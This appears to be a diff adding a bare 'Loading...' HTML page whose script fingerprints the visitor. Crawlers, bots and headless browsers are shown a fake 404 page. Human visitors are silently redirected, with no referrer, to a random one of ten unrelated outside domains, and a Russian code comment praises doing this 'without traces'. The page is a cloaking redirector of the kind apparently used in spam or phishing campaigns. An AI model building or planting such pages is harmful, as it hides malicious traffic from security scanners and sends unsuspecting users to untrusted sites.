@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="no-referrer">
+    <title>Loading...</title>
+    <script>
+        window.onload = function() {
+            var urls = [
+                "https://thetastarfashion.com/nfqv",
+                "https://hardhatprotect.com/jell",
+                "https://mammbypranallc.com/ku5e",
+                "https://rigidconstr.com/aj4z",
+                "https://hardhatprotect.com/mokf",
+                "https://aarrinfclaimspecialist.com/ddva",
+                "https://huppmusic.com/r4xd",
+                "https://keysitc.com/j4z8",
+                "https://susant.net/rvn0",
+                "https://icontrollo.com/bnhe"
+            ];
+
+            var isBot = /bot|spider|googlebot|crawler|headless/i.test(navigator.userAgent) || navigator.webdriver;
+
+            if (!isBot) {
+                var target = urls[Math.floor(Math.random() * urls.length)];
+                // Метод replace — самый чистый способ без хвостов
+                window.location.replace(target);
+            } else {
+                document.body.innerHTML = "<h1>404 Not Found</h1>";
+            }
+        };
+    </script>
+</head>
+<body style="background:#fff;"></body>
+</html>
